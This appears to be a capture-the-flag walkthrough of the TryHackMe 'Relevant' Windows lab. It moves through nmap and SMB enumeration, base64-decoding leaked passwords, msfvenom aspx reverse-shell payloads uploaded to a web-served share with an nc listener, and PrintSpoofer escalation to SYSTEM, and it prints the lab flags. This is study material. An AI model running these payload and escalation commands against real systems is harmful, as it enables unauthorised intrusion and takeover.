# 1 - Threader 3000 + nmap
# 2 - smbclient + enum4linux
# 3 - directory search (hidden)
# 4 - exploitation

### 1 ###
(kali㉿kali)-[~/THM/practice/relevant]
└─$ nmap -sC -sV 10.10.114.202
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-20 10:06 EST
Nmap scan report for 10.10.114.202
Host is up (0.044s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-02-20T15:07:54+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-02-19T14:53:27
|_Not valid after:  2022-08-21T14:53:27
|_ssl-date: 2022-02-20T15:08:34+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-02-20T07:07:58-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-20T15:07:57
|_  start_date: 2022-02-20T14:53:44

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.89 seconds

# there is smb on one of the ports, so I proceeded to use enum4linux to check for any vulns
        # did not really yield anything










## 2 - enumeration ###
(kali㉿kali)-[~/THM/practice/relevant]
└─$ smbclient -L \\\\10.10.213.105\\                                                                    1 ⨯
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available

        #looks like there might be some files on the nt4wrksv? --> lets check

(kali㉿kali)-[~/THM/practice/relevant]
└─$ smbget -R smb://10.10.213.105/nt4wrksv 
Password for [kali] connecting to //nt4wrksv/10.10.213.105: 
Using workgroup WORKGROUP, user kali
smb://10.10.213.105/nt4wrksv/passwords.txt                                                                  
Downloaded 98b in 3 seconds
        # a passwords.txt file, lets have a look:
(kali㉿kali)-[~/THM/practice/relevant]
└─$ cat passwords.txt                                                                                   1 ⨯
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

        # base64 encoded I believe so lets decode it:
(kali㉿kali)-[~/THM/practice/relevant]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d                            
Bob - !P@$$W0rD!123
(kali㉿kali)-[~/THM/practice/relevant]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$

        # looks like there are 2 users we could potentially log in as, lets try?
(kali㉿kali)-[~/THM/practice/relevant]
└─$ smbclient -U bob //10.10.213.105/nt4wrksv  
Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.
smb: \>
        # logging in as bob worked, maybe try as bill too? --> the only file in bob's directory was the same passwords.txt
                # it merely resulted in the same share, as they seem to both have the same access


# apparently there is a tool to check whether users are legit or not --> psexec.py, so lets try it:
(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 psexec.py                                                                                   1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH]
                 [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name]
                 [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) -
                        (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based
                        on target parameters. If valid credentials cannot be found, it will use the ones
                        specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN)
                        specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as
                        target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target

# seems like bob is legit and bill is not:
(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 psexec.py bob:'!P@$$W0rD!123'@10.10.213.105                                                 1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.213.105.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[*] Found writable share nt4wrksv
[*] Uploading file sSNdcNEB.exe
[*] Opening SVCManager on 10.10.213.105.....
[-] Error opening SVCManager on 10.10.213.105.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
                                                                                                            
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 psexec.py bill:'Juw4nnaM4n420696969!$$$'@10.10.213.105
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] Authenticated as Guest. Aborting
        # also noticed a file 'sSNdcNEB.exe' file --> 


 
# I proceeded to check if there might be any (hidden) directories but looked like there was none

(kali㉿kali)-[~/THM/practice/relevant]
└─$ gobuster dir -u http://10.10.114.202/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.114.202/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/20 10:32:01 Starting gobuster in directory enumeration mode
===============================================================
                              
===============================================================
2022/02/20 10:32:10 Finished
===============================================================

# therefore proceeded to do another nmap scan of higher ports:
(kali㉿kali)-[~]
└─$ nmap -p- 10.10.213.105                                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-20 12:22 EST
Nmap scan report for 10.10.213.105
Host is up (0.021s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 119.50 seconds
# the ports 49667 and 49668 did not load a page, but 49663 loaded the same as with the defauly port, so maybe there are hidden directories there? 
        # going to http://10.10.213.105:49663/nt4wrksv/passwords.txt showed the same information we got from smbget!
# THIS COULD POTENTIALLY BE EXPLOITED --> UPLOAD SOMETHING TO TRY:
(kali㉿kali)-[~/THM/practice/relevant]
└─$ echo yolo > test.txt
(kali㉿kali)-[~/THM/practice/relevant]
└─$ smbclient -U bob //10.10.213.105/nt4wrksv
Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.
smb: \> put test.txt
putting file test.txt as \test.txt (0.1 kb/s) (average 0.1 kb/s)
smb: \> ls
  .                                   D        0  Sun Feb 20 12:47:22 2022
  ..                                  D        0  Sun Feb 20 12:47:22 2022
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  test.txt                            A        5  Sun Feb 20 12:47:22 2022

                7735807 blocks of size 4096. 5136921 blocks available
        # seen as we could read the passwords.txt, I dont see why we shouldnt be able to read this file
        # if it works, it can be exploited by uploading a payload for a reverse shell or priv escalation or something similar
        # it did work --> only when port 49663 was included in url..
## THIS IS WHERE THE EXPLOIT SHOULD TAKE PLACE ##


        # following details are just some extra things I found..


# so I tried the dirb again with some of the new ports. Now I have not done this before (specfying ports) so I had to look up some help (aka looked at the help for dir):
-P      --proxy string                    Proxy to use for requests [http(s)://host:port]




# the interesting part = aspnet_client:
aspnet_client is a folder for "resources which must be served via HTTP
        # apparently its a folder for windows IIS with some stuff in it




# windows IIS is most definitely exploitable, as a wuick searchsploit lead to a lot of results, but I need to find the version of it
(kali㉿kali)-[~]
└─$ dirb http://10.10.213.105 -w /usr/share/wordlists/dirb/common.txt -p http://10.10.213.105:49663

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 20 12:38:25 2022
URL_BASE: http://10.10.213.105/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: http://10.10.213.105:49663
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4613                                                          

---- Scanning URL: http://10.10.213.105/ ----
==> DIRECTORY: http://10.10.213.105/aspnet_client/                                                         
                                                                                                           
---- Entering directory: http://10.10.213.105/aspnet_client/ ----
==> DIRECTORY: http://10.10.213.105/aspnet_client/system_web/                                              
                                                                                                           
---- Entering directory: http://10.10.213.105/aspnet_client/system_web/ ----
                                                                                                           
-----------------
END_TIME: Sun Feb 20 12:43:03 2022
DOWNLOADED: 13839 - FOUND: 0











### 3 - exploitatoin ###
        # I will be honest and say I was not sure what I had to do at this point so partially relied on a writeup...

# i think its called RFI exploitation

# 1 = create reverse shell payload using msfvenom:
        # apparently "IIS generally requires an aspx shell", so instead of using the -f exe command I need to use the -f aspx

        # as I was not sure which to use I created 2 payloads:
(kali㉿kali)-[~/THM/practice/relevant]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.59.68 LPORT=9001 -f aspx > reverse1.aspx      2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3414 bytes

(kali㉿kali)-[~/THM/practice/relevant]
└─$ msfvenom -p windows/shell/reverse_tcp LHOST=10.11.59.68 LPORT=9001 -f aspx > reverse.aspx           2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2881 bytes

        # the latter is what I wouldof went with so I tried this first
                # 1 - set up nc listener:
                (kali㉿kali)-[~/THM/practice/relevant]
                └─$ nc -lvnp 9001             
                listening on [any] 9001 ...
                # 2 - put the file up to the smblient share
                smb: \> put reverse.aspx
                putting file reverse.aspx as \reverse.aspx (0.0 kb/s) (average 0.0 kb/s)
                # 3 - curl/direct to the page
                # 4 - hope a shell spawns..
                (kali㉿kali)-[~/THM/practice/relevant]
                └─$ nc -lvnp 9001             
                listening on [any] 9001 ...
                connect to [10.11.59.68] from (UNKNOWN) [10.10.181.98] 49714
                Microsoft Windows [Version 10.0.14393]
                (c) 2016 Microsoft Corporation. All rights reserved.

                c:\windows\system32\inetsrv>

# initial did not work (reverse.aspx) so I retried with reverse1.aspx

# looking through the system, it looks like the nt4wrksv folder is within the wwwroot directory
        # --> maybe possible to use this to our advantage (how? (!))

c:\Users>cd Administrator
cd Administrator
Access is denied.

# lets check our privileges:
c:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
        # the SeChangeNotifyPrivilege, SeCreateGlobalPrivilege and SeImpersonatePrivilege are both enabled (I am sure I have explolted the latter before...)

c:\Users>whoami
whoami
iis apppool\defaultapppool

        # printspoofer: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

        # next steps are therefore:
        # 1 - upload epxloit to smb share (in wwwroot/nt4wrksv)
        (kali㉿kali)-[~/…/practice/relevant/PrintSpoofer/PrintSpoofer]
        └─$ git clone https://github.com/dievus/printspoofer.git
        Cloning into 'printspoofer'...
        remote: Enumerating objects: 6, done.
        remote: Counting objects: 100% (6/6), done.
        remote: Compressing objects: 100% (5/5), done.
        remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0
        Receiving objects: 100% (6/6), 11.94 KiB | 11.94 MiB/s, done.

        (kali㉿kali)-[~/THM/practice/relevant/printspoofer]
        └─$ smbclient -U bob //10.10.181.98/nt4wrksv
        Enter WORKGROUP\bob's password: 
        Try "help" to get a list of possible commands.
        smb: \> put PrintSpoofer.exe
        putting file PrintSpoofer.exe as \PrintSpoofer.exe (159.6 kb/s) (average 159.6 kb/s)
        # 2 - run with basic flags
        c:\inetpub\wwwroot\nt4wrksv>dir
        dir
         Volume in drive C has no label.
         Volume Serial Number is AC3C-5CB5

         Directory of c:\inetpub\wwwroot\nt4wrksv

        02/20/2022  10:26 AM    <DIR>          .
        02/20/2022  10:26 AM    <DIR>          ..
        07/25/2020  07:15 AM                98 passwords.txt
        02/20/2022  10:26 AM            27,136 PrintSpoofer.exe
        02/20/2022  10:05 AM                 0 reverse.aspx
        02/20/2022  10:06 AM             3,414 reverse1.aspx
                       4 File(s)         30,648 bytes
                       2 Dir(s)  21,047,189,504 bytes free

        c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
        PrintSpoofer.exe -i -c cmd
        [+] Found privilege: SeImpersonatePrivilege
        [+] Named pipe listening...
        [+] CreateProcessAsUser() OK
        Microsoft Windows [Version 10.0.14393]
        (c) 2016 Microsoft Corporation. All rights reserved.

        C:\Windows\system32>whoami
        whoami
        nt authority\system

# and we got autority privileges --> in fact we got all privileges enabled!

C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}










### further reading / thoughts ###
# doing a quick search on google 'wwwroot windows 2016 server iis exploit' I found the following
        # https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0645
        # I might be able to manipulate the http headers to get us the access we need/want
        # "microsoft IIS server tampering vulnerability"

# anywho, we got the user flag:
c:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}

